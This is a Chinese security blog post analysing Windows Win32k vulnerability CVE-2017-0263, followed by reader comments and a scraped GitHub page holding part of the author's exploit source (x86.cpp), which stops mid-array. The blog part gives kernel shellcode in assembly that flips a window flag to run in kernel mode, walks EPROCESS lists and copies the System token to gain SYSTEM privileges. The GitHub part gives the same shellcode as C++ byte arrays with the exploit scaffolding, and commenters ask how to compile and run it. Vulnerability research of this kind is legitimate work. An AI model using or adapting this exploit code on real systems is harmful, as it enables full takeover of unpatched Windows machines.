在利用代码的自定义阴影窗口消息处理函数 `xxxShadowWindowProc` 中初始化 `MENUNAME` 字段缓冲区数值时，将成员标志位 `bDialogWindow` 的地址减 `4` 字节偏移的地址作为伪造 `tagPOPUPMENU` 对象的某个窗口对象指针成员域（例如 `spwndPrevPopup` 成员域）的数值，使前面提到的三个标志位正好位于该指针成员域指向的“窗口对象”的锁计数成员域 `cLockObj` 的最低 3 比特位：

```
dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
```

在函数 `xxxMNEndMenuState` 执行期间，系统为根弹出菜单对象的成员域 `spwndPrevPopup` 调用函数 `HMAssignmentUnlock` 以解除对目标窗口对象的赋值锁时，将直接对以成员标志位 `bDialogWindow` 地址起始的 32 位数值自减，这将使成员标志位 `bServerSideWindowProc` 被置位。

![]()
*通过自减指令使目标比特位被置位*

由于成员标志位 `bServerSideWindowProc` 置位，载体窗口对象将获得在内核上下文直接执行窗口对象消息处理函数的能力。

---

**ShellCode**

ShellCode 函数代码将作为载体窗口对象的自定义消息处理函数在内核上下文直接执行。在构造 ShellCode 函数代码之前，首先对所需的数据进行初始化和赋值。

根据前面构造的利用代码，我们已实现漏洞触发后在函数 `xxxMNEndMenuState` 第二次执行期间不引发系统异常而成功执行，但第二次释放的根弹出菜单对象实际上是批量创建的普通窗口对象中某个窗口对象所属窗口类 `tagCLS` 对象的成员域 `lpszMenuName` 指向的缓冲区。这将导致在进程退出时销毁用户对象期间，系统在内核中释放目标窗口类对象成员域 `lpszMenuName` 时引发重复释放的异常，因此需要在 ShellCode 代码中将目标窗口类对象的成员域 `lpszMenuName` 置空。

在利用代码批量创建普通窗口对象期间，增加获取每个窗口对象的成员域 `pcls` 指向地址的语句，并将获取到的各个 `pcls` 指向地址存储在结构体 `SHELLCODE` 对象的成员数组 `tagCLS[]` 中。

```
static constexpr UINT num_offset_WND_pcls = 0x64;
for (INT i = 0; i < iWindowCount; i++)
{
    pvShellCode->tagCLS[i] = *(PVOID *)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num_offset_WND_pcls);
}
```

*获取 tagCLS 地址并存储在结构体 SHELLCODE 对象的利用代码*

查找需置空成员域 `lpszMenuName` 的目标窗口类对象需要通过与根弹出菜单对象的内核地址进行匹配，因此需要利用代码在用户进程中获取根弹出菜单对象的内核地址。这可以在事件通知处理函数 `xxWindowEventProc` 中实现：

```
VOID CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    if (iMenuCreated == 0)
    {
        popupMenuRoot = *(DWORD *)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0);
    }
    if (++iMenuCreated >= 2)
    {
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002);
    }
}
```

*在函数 xxWindowEventProc 中增加获取根弹出菜单对象地址的利用代码*

在利用代码开始的位置初始化结构体 `SHELLCODE` 对象缓冲区时，拷贝利用函数 `xxPayloadWindProc` 的代码到 `SHELLCODE` 对象缓冲区中。接下来实现对 `xxPayloadWindProc` 函数代码的构造。该函数的代码将作为载体窗口对象的内核模式消息处理函数在内核上下文中执行。与在用户上下文中执行的窗口对象消息处理函数稍有不同的是，内核模式窗口对象消息处理函数的第 1 个参数是指向目标窗口 `tagWND` 对象的指针，其余参数都相同。

为了精确识别触发提权的操作，在代码中定义 `0x9F9F` 为触发提权的消息。在 ShellCode 函数代码中，我们首先判断传入的消息参数是否是我们自定义的提权消息：

```
push    ebp
mov     ebp,esp
mov     eax,dword ptr [ebp+0Ch]
cmp     eax,9F9Fh
jne     LocFAILED
```

在 32 位的 Windows 操作系统中，用户上下文代码段寄存器 `CS` 值为 `0x1B`，借助这个特性，在 ShellCode 函数代码中判断当前执行上下文是否在用户模式下，如是则返回失败。

```
mov     ax,cs
cmp     ax,1Bh
je      LocFAILED
```

恢复载体窗口对象的成员标志位为初始值。与之前修改标志位时的自减相对地，使成员标志位 `bDialogWindow` 地址起始的 32 位数据直接自增，这样一来，成员标志位 `bServerSideWindowProc` 等被修改的标志位将恢复到修改之前的状态。

```
cld
mov     ecx,dword ptr [ebp+8]
inc     dword ptr [ecx+16h]
```

首先备份当前所有通用寄存器的数值在栈上，接下来通过 `CALL-POP` 技术获取当前 `EIP` 执行指令的地址，并根据相对偏移计算出存储在 ShellCode 函数代码前面位置的结构体 `SHELLCODE` 对象的首地址：

```
pushad
call    $+5
pop     edx
sub     edx,443h
```

遍历结构体 `SHELLCODE` 对象存储的 `tagCLS` 数组并与通过参数 `wParam` 传入的根弹出菜单对象的内核地址进行匹配，并将匹配到的 `tagCLS` 对象的成员域 `lpszMenuName` 置空。

```
mov     ebx,100h
lea     esi,[edx+18h]
mov     edi,dword ptr [ebp+10h]

LocForCLS:
test    ebx,ebx
je      LocGetEPROCESS
lods    dword ptr [esi]
dec     ebx
cmp     eax,0
je      LocForCLS
add     eax,dword ptr [edx+8]
cmp     dword ptr [eax],edi
jne     LocForCLS
and     dword ptr [eax],0
jmp     LocForCLS
```

接下来获取载体窗口对象头部结构中存储的线程信息 `tagTHREADINFO` 对象指针，并继续获取线程信息对象中存储的进程信息 `tagPROCESSINFO` 对象指针，并获取对应进程的进程体 `EPROCESS` 对象指针。各个成员域的偏移在结构体 `SHELLCODE` 对象中存储。

```
LocGetEPROCESS:
mov     ecx,dword ptr [ecx+8]
mov     ebx,dword ptr [edx+0Ch]
mov     ecx,dword ptr [ebx+ecx]
mov     ecx,dword ptr [ecx]
mov     ebx,dword ptr [edx+10h]
mov     eax,dword ptr [edx+4]
```

接下来根据进程体 `EPROCESS` 对象的成员域 `ActiveProcessLinks` 双向链表和成员域 `UniqueProcessId` 进程标识符找到当前进程的 `EPROCESS` 地址。由于 `UniqueProcessId` 是成员域 `ActiveProcessLinks` 的前一个成员域，因此直接使用 `SHELLCODE` 对象中存储的 `ActiveProcessLinks` 偏移值来定位 `UniqueProcessId` 的位置。

```
push    ecx

LocForCurrentPROCESS:
cmp     dword ptr [ebx+ecx-4],eax
je      LocFoundCURRENT
mov     ecx,dword ptr [ebx+ecx]
sub     ecx,ebx
jmp     LocForCurrentPROCESS

LocFoundCURRENT:
mov     edi,ecx
pop     ecx
```

紧接着继续遍历进程体 `EPROCESS` 对象链表，以找到 System 进程的进程体对象地址。

```
LocForSystemPROCESS:
cmp     dword ptr [ebx+ecx-4],4
je      LocFoundSYSTEM
mov     ecx,dword ptr [ebx+ecx]
sub     ecx,ebx
jmp     LocForSystemPROCESS

LocFoundSYSTEM:
mov     esi,ecx
```

执行到这一步已定位到当前进程和 System 进程的进程体对象地址，接下来就使用 System 进程的成员域 `Token` 指针替换当前进程的 `Token` 指针。

```
mov     eax,dword ptr [edx+14h]
add     esi,eax
add     edi,eax
lods    dword ptr [esi]
stos    dword ptr es:[edi]
```

此时当前进程已拥有 System 进程的 `Token` 指针，额外增加的引用需要手动为目标 `Token` 对象增加对象引用计数。在 NT 执行体模块中大多数内核对象都是以 `OBJECT_HEADER` 结构体作为头部结构：

```
kd> dt nt!_OBJECT_HEADER
   +0x000 PointerCount     : Int4B
   +0x004 HandleCount      : Int4B
   [...]
   +0x014 SecurityDescriptor : Ptr32 Void
   +0x018 Body             : _QUAD
```

该结构位于内核对象地址前面的位置，内核对象起始于 `OBJECT_HEADER` 结构体的 `Body` 成员域。手动增加指针引用需要对成员域 `PointerCount` 进行自增。

```
and     eax,0FFFFFFF8h
add     dword ptr [eax-18h],2
```

接下来大功告成，恢复前面备份的通用寄存器的数值到寄存器中，并赋值返回值为 `0x9F9F` 作为向调用者的反馈信息。

```
popad
mov     eax,9F9Fh
jmp     LocRETURN

LocFAILED:
mov     eax,1

LocRETURN:
leave
ret     10h
```

至此 ShellCode 函数代码已编写完成。

---

**触发提权**

万事俱备，只欠东风。接下来在利用代码的自定义阴影窗口消息处理函数 `xxShadowWindowProc` 中调用系统服务 `NtUserMNDragLeave` 之后的位置增加对载体窗口对象发送自定义提权消息 `0x9F9F` 的调用语句，并将返回值的判断结果存储在全局变量 `bDoneExploit` 中。

```
LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0);
bDoneExploit = Triggered == 0x9F9F;
```

*在函数 xxShadowWindowProc 中增加发送提权消息的利用代码*

这样一来，在执行系统服务 `NtUserMNDragLeave` 以置位载体窗口对象的成员标志位 `bServerSideWindowProc` 之后，函数发送 `0x9F9F` 消息并将根弹出菜单对象的内核地址作为 `wParam` 参数传入，执行流将在内核上下文中直接调用载体窗口对象的自定义消息处理函数，执行到由用户进程定义的 ShellCode 代码中，实现内核提权和相关内核用户对象成员域的修复。

通过主线程监听全局变量 `bDoneExploit` 是否被赋值；如成功赋值则创建新的命令提示符进程。

![]()
*启动的命令提示符进程已属于 System 用户身份*

可以观测到新启动的命令提示符已属于 System 用户身份。

---

**后记**

在本分析中构造验证代码和利用代码时，处理逻辑与原攻击样本的代码稍有差异。例如，攻击样本为了保证成功率，在代码中增加了暂时挂起全部线程的操作，还将菜单和子菜单的个数设定为 3 个，还有重试机制等。在本分析中为了实现最简验证和利用代码，对这些不必要的因素进行了省略。

## 0x5 链接

本分析的英文版本：<https://xiaodaozhi.com/exploit/117.html>

[0] 本分析的 POC 下载

<https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2017-0263/x86.cpp>

[1] Kernel Attacks through User-Mode Callbacks

<http://media.blackhat.com/bh-us-11/Mandt/BH_US_11_Mandt_win32k_WP.pdf>

[2] 从 Dump 到 POC 系列一: Win32k 内核提权漏洞分析

<http://blogs.360.cn/blog/dump-to-poc-to-win32k-kernel-privilege-escalation-vulnerability/>

[3] TrackPopupMenuEx function (Windows)

[https://msdn.microsoft.com/en-us/library/windows/desktop/ms648003(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648003%28v%3Dvs.85%29.aspx)

[4] sam-b/windows\_kernel\_address\_leaks

<https://github.com/sam-b/windows_kernel_address_leaks>

[5] Sednit adds two zero-day exploits using 'Trump's attack on Syria' as a decoy

<https://www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy/>

[6] EPS Processing Zero-Days Exploited by Multiple Threat Actors

<https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html>

- THE END -

文章链接: [https://www.anquanke.com/post/id/102377](https://www.anquanke.com/post/id/102377 "从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件")

 [漏洞](https://xiaodaozhi.com/exploit/) [分析调试](https://xiaodaozhi.com/tag/%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95/) [内核提权](https://xiaodaozhi.com/tag/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/) [内核漏洞](https://xiaodaozhi.com/tag/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/) [WIN32K](https://xiaodaozhi.com/tag/WIN32K/) [释放后重用](https://xiaodaozhi.com/tag/%E9%87%8A%E6%94%BE%E5%90%8E%E9%87%8D%E7%94%A8/)
[文章知识产权许可声明](https://xiaodaozhi.com/license.html)

新一篇: [From CVE-2017-0263 To Windows Menu Management Component](https://xiaodaozhi.com/exploit/117.html "From CVE-2017-0263 To Windows Menu Management Component")

旧一篇: [分析笔记：MS17-017 中的整数溢出漏洞](https://xiaodaozhi.com/exploit/70.html "分析笔记：MS17-017 中的整数溢出漏洞")

### 有 18 条评论

1. ![fr4nk_1u](//ixnet.icu/avatar/85bda8adc9f4c639d5a882d5a0d19a21?s=32&r=G&d=mm)
   **fr4nk\_1u**
   2019-05-02 00:57 #74
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=74#respond-post-71)

   每看一遍都有新的认识，谢谢

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2019-05-02 19:51 #75 -> [#74](#comment-74)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=75#respond-post-71)

      感谢阅读~~
2. ![goabout2](//ixnet.icu/avatar/20b09f722dd9d268743f845270646638?s=32&r=G&d=mm)
   **goabout2**
   2019-10-01 17:44 #88
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=88#respond-post-71)

   每次都在更新呀，666666
3. ![Toddler](//ixnet.icu/avatar/bdf7e04ec578e3d8369b119b89106f18?s=32&r=G&d=mm)
   **Toddler**
   2019-10-30 16:17 #94
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=94#respond-post-71)

   师傅你好，文章写得特别详细，感谢师傅的分享
   其次我可以问一下这么详细的关于菜单组件的知识是怎么得来的吗？是通过逆向自己分析吗亦或者是有其它渠道？

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2019-10-30 16:27 #95 -> [#94](#comment-94)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=95#respond-post-71)

      感谢阅读。这部分的知识可以通过逆向分析、再加上和WRK、NT4等旧版本源码中定义的结构对比来掌握。
4. ![sonder](//ixnet.icu/avatar/4426bcb02d7e1614d9c7162ec47651ec?s=32&r=G&d=mm)
   **sonder**
   2021-01-17 13:32 #133
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=133#respond-post-71)

   师傅这个exp需要什么环境编译

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2021-01-17 13:58 #134 -> [#133](#comment-133)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=134#respond-post-71)

      VS2015+，生成32位目标文件
   2. ![sonder](//ixnet.icu/avatar/4426bcb02d7e1614d9c7162ec47651ec?s=32&r=G&d=mm)
      **sonder**
      2021-01-17 14:19 #135 -> [#133](#comment-133)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=135#respond-post-71)

      是不是编译生成exe放在win7虚拟机运行就可以复现漏洞了？
   3. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2021-01-17 15:22 #137 -> [#133](#comment-133)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=137#respond-post-71)

      对，是这样的。poc本身可以在32位win7sp1触发。64位需要改造。
5. ![sonder](//ixnet.icu/avatar/4426bcb02d7e1614d9c7162ec47651ec?s=32&r=G&d=mm)
   **sonder**
   2021-01-17 15:12 #136
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=136#respond-post-71)

   师傅，这个POC是用VS2015生成32位exe然后在win7中直接运行吗
6. ![sonder](//ixnet.icu/avatar/4426bcb02d7e1614d9c7162ec47651ec?s=32&r=G&d=mm)
   **sonder**
   2021-02-26 16:26 #138
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=138#respond-post-71)

   小刀师傅好，我想问一下poc复现的话我应该在哪里下断点？我用windbg preview调试一直无法令poc停下来看内存

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2021-02-26 16:32 #139 -> [#138](#comment-138)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=139#respond-post-71)

      是要断在内核还是用户态呢？内核的话可以使用WinDbg的硬件断点命令ba e1 xxxxx下断点，用户态的话可以把POC里的POCDEBUG宏设置为2（会在一些关键节点断下来方便调试跟进）然后编译。
   2. ![sonder](//ixnet.icu/avatar/4426bcb02d7e1614d9c7162ec47651ec?s=32&r=G&d=mm)
      **sonder**
      2021-02-26 16:38 #140 -> [#138](#comment-138)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=140#respond-post-71)

      我是想运行poc和exp验证漏洞的存在性和可利用性，以及查看这个过程中的内存布局，您看这应该在用户态还是内核态呢？不好意思我是新手入门不太懂，麻烦小刀师傅了
   3. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2021-02-26 17:37 #150 -> [#138](#comment-138)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=150#respond-post-71)

      两种都需要的
   4. ![sonder](//ixnet.icu/avatar/4426bcb02d7e1614d9c7162ec47651ec?s=32&r=G&d=mm)
      **sonder**
      2021-02-26 21:55 #151 -> [#138](#comment-138)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=151#respond-post-71)

      师傅，POCDEBUG宏需要我自己添加吗
   5. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2021-02-28 12:58 #152 -> [#138](#comment-138)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=152#respond-post-71)

      在poc中就有的
7. ![y05hk1](//ixnet.icu/avatar/ffa8b913cf8ad8175e58ea027d4840f8?s=32&r=G&d=mm)
   **y05hk1**
   2021-10-12 17:10 #165
   [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=165#respond-post-71)

   感谢小刀师傅

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2021-10-13 08:37 #166 -> [#165](#comment-165)
      [回复](https://xiaodaozhi.com/exploit/71.html?replyTo=166#respond-post-71)

      感谢阅读

内容

* 发表评论

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号

* 文章目录

---



=== Content from github.com_afc11895_20250126_091026.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fleeqwind%2FHolicPOC%2Fblob%2Fmaster%2Fwindows%2Fwin32k%2FCVE-2017-0263%2Fx86.cpp)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fleeqwind%2FHolicPOC%2Fblob%2Fmaster%2Fwindows%2Fwin32k%2FCVE-2017-0263%2Fx86.cpp)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=leeqwind%2FHolicPOC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[leeqwind](/leeqwind)
/
**[HolicPOC](/leeqwind/HolicPOC)**
Public

* [Notifications](/login?return_to=%2Fleeqwind%2FHolicPOC) You must be signed in to change notification settings
* [Fork
  45](/login?return_to=%2Fleeqwind%2FHolicPOC)
* [Star
   92](/login?return_to=%2Fleeqwind%2FHolicPOC)

* [Code](/leeqwind/HolicPOC)
* [Issues
  1](/leeqwind/HolicPOC/issues)
* [Pull requests
  0](/leeqwind/HolicPOC/pulls)
* [Actions](/leeqwind/HolicPOC/actions)
* [Projects
  0](/leeqwind/HolicPOC/projects)
* [Security](/leeqwind/HolicPOC/security)
* [Insights](/leeqwind/HolicPOC/pulse)

Additional navigation options

* [Code](/leeqwind/HolicPOC)
* [Issues](/leeqwind/HolicPOC/issues)
* [Pull requests](/leeqwind/HolicPOC/pulls)
* [Actions](/leeqwind/HolicPOC/actions)
* [Projects](/leeqwind/HolicPOC/projects)
* [Security](/leeqwind/HolicPOC/security)
* [Insights](/leeqwind/HolicPOC/pulse)

## Files

 master
## Breadcrumbs

1. [HolicPOC](/leeqwind/HolicPOC/tree/master)
2. /[windows](/leeqwind/HolicPOC/tree/master/windows)
3. /[win32k](/leeqwind/HolicPOC/tree/master/windows/win32k)
4. /[CVE-2017-0263](/leeqwind/HolicPOC/tree/master/windows/win32k/CVE-2017-0263)
/
# x86.cpp

Copy path Blame  Blame
## Latest commit

## History

[History](/leeqwind/HolicPOC/commits/master/windows/win32k/CVE-2017-0263/x86.cpp)567 lines (525 loc) · 17.9 KB master
## Breadcrumbs

1. [HolicPOC](/leeqwind/HolicPOC/tree/master)
2. /[windows](/leeqwind/HolicPOC/tree/master/windows)
3. /[win32k](/leeqwind/HolicPOC/tree/master/windows/win32k)
4. /[CVE-2017-0263](/leeqwind/HolicPOC/tree/master/windows/win32k/CVE-2017-0263)
/
# x86.cpp

Top
## File metadata and controls

* Code
* Blame

567 lines (525 loc) · 17.9 KB[Raw](https://github.com/leeqwind/HolicPOC/raw/refs/heads/master/windows/win32k/CVE-2017-0263/x86.cpp)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567/\*\* \* Exploit: CVE-2017-0263 \* Author: Leeqwind (@leeqwind) \* Paper(zh): https://xiaodaozhi.com/exploit/71.html \* Paper(en): https://xiaodaozhi.com/exploit/117.html \* Declaration: NO LEGAL LIABILITY. \*/
#include <Windows.h>#include <wingdi.h>#include <iostream>#include <Psapi.h>#pragma comment(lib, "psapi.lib")
#define POCDEBUG 0
#if POCDEBUG == 1#define POCDEBUG\_BREAK() getchar()#elif POCDEBUG == 2#define POCDEBUG\_BREAK() \_\_debugbreak()#else#define POCDEBUG\_BREAK()#endif
static PVOID(\_\_fastcall \*pfnHMValidateHandle)(HANDLE, BYTE) = NULL;
static constexpr UINT num\_PopupMenuCount = 2;static constexpr UINT num\_WndShadowCount = 3;static constexpr UINT num\_offset\_WND\_pcls = 0x64;
static HMENU hpopupMenu[num\_PopupMenuCount] = { 0 };static UINT iMenuCreated = 0;static BOOL bDoneExploit = FALSE;static DWORD popupMenuRoot = 0;static HWND hWindowMain = NULL;static HWND hWindowHunt = NULL;static HWND hWindowList[0x100] = { 0 };static UINT iWindowCount = 0;static PVOID pvHeadFake = NULL;static PVOID pvAddrFlags = NULL;
typedef struct \_HEAD { HANDLE h; DWORD cLockObj;} HEAD, \*PHEAD;
typedef struct \_THROBJHEAD { HEAD head; PVOID pti;} THROBJHEAD, \*PTHROBJHEAD;
typedef struct \_DESKHEAD { PVOID rpdesk; PBYTE pSelf;} DESKHEAD, \*PDESKHEAD;
typedef struct \_THRDESKHEAD { THROBJHEAD thread; DESKHEAD deskhead;} THRDESKHEAD, \*PTHRDESKHEAD;
typedef struct \_SHELLCODE { DWORD reserved; DWORD pid; DWORD off\_CLS\_lpszMenuName; DWORD off\_THREADINFO\_ppi; DWORD off\_EPROCESS\_ActiveLink; DWORD off\_EPROCESS\_Token; PVOID tagCLS[0x100]; BYTE pfnWindProc[];} SHELLCODE, \*PSHELLCODE;
static PSHELLCODE pvShellCode = NULL;
// Arguments:// [ebp+08h]:pwnd = pwndWindowHunt;// [ebp+0Ch]:msg = 0x9F9F;// [ebp+10h]:wParam = popupMenuRoot;// [ebp+14h]:lParam = NULL;// In kernel-mode, the first argument is tagWND pwnd.staticBYTExxPayloadWindProc[] = { // Loader+0x108a: // Judge if the `msg` is 0x9f9f value. 0x55, // push ebp 0x8b, 0xec, // mov ebp,esp 0x8b, 0x45, 0x0c, // mov eax,dword ptr [ebp+0Ch] 0x3d, 0x9f, 0x9f, 0x00, 0x00, // cmp eax,9F9Fh 0x0f, 0x85, 0x8d, 0x00, 0x00, 0x00, // jne Loader+0x1128 // Loader+0x109b: // Judge if CS is 0x1b, which means in user-mode context. 0x66, 0x8c, 0xc8, // mov ax,cs 0x66, 0x83, 0xf8, 0x1b, // cmp ax,1Bh 0x0f, 0x84, 0x80, 0x00, 0x00, 0x00, // je Loader+0x1128 // Loader+0x10a8: // Get the address of pwndWindowHunt to ECX. // Recover the flags of pwndWindowHunt: zero bServerSideWindowProc. // Get the address of pvShellCode to EDX by CALL-POP. // Get the address of pvShellCode->tagCLS[0x100] to ESI. // Get the address of popupMenuRoot to EDI. 0xfc, // cld 0x8b, 0x4d, 0x08, // mov ecx,dword ptr [ebp+8] 0xff, 0x41, 0x16, // inc dword ptr [ecx+16h] 0x60, // pushad 0xe8, 0x00, 0x00, 0x00, 0x00, // call $5 0x5a, // pop edx 0x81, 0xea, 0x43, 0x04, 0x00, 0x00, // sub edx,443h 0xbb, 0x00, 0x01, 0x00, 0x00, // mov ebx,100h 0x8d, 0x72, 0x18, // lea esi,[edx+18h] 0x8b, 0x7d, 0x10, // mov edi,dword ptr [ebp+10h] // Loader+0x10c7: 0x85, 0xdb, // test ebx,ebx 0x74, 0x13, // je Loader+0x10de // Loader+0x10cb: // Judge if pvShellCode->tagCLS[ebx] == NULL 0xad, // lods dword ptr [esi] 0x4b, // dec ebx 0x83, 0xf8, 0x00, // cmp eax,0 0x74, 0xf5, // je Loader+0x10c7 // Loader+0x10d2: // Judge if tagCLS->lpszMenuName == popupMenuRoot 0x03, 0x42, 0x08, // add eax,dword ptr [edx+8] 0x39, 0x38, // cmp dword ptr [eax],edi 0x75, 0xee, // jne Loader+0x10c7 // Loader+0x10d9: // Zero tagCLS->lpszMenuName 0x83, 0x20, 0x00, // and dword ptr [eax],0 0xeb, 0xe9, // jmp Loader+0x10c7 // Loader+0x10de: // Get the value of pwndWindowHunt->head.pti->ppi->Process to ECX. // Get the value of pvShellCode->pid to EAX. 0x8b, 0x49, 0x08, // mov ecx,dword ptr [ecx+8] 0x8b, 0x5a, 0x0c, // mov ebx,dword ptr [edx+0Ch] 0x8b, 0x0c, 0x0b, // mov ecx,dword ptr [ebx+ecx] 0x8b, 0x09, // mov ecx,dword ptr [ecx] 0x8b, 0x5a, 0x10, // mov ebx,dword ptr [edx+10h] 0x8b, 0x42, 0x04, // mov eax,dword ptr [edx+4] 0x51, // push ecx // Loader+0x10f0: // Judge if EPROCESS->UniqueId == pid. 0x39, 0x44, 0x0b, 0xfc, // cmp dword ptr [ebx+ecx-4],eax 0x74, 0x07, // je Loader+0x10fd // Loader+0x10f6: // Get next EPROCESS to ECX by ActiveLink. 0x8b, 0x0c, 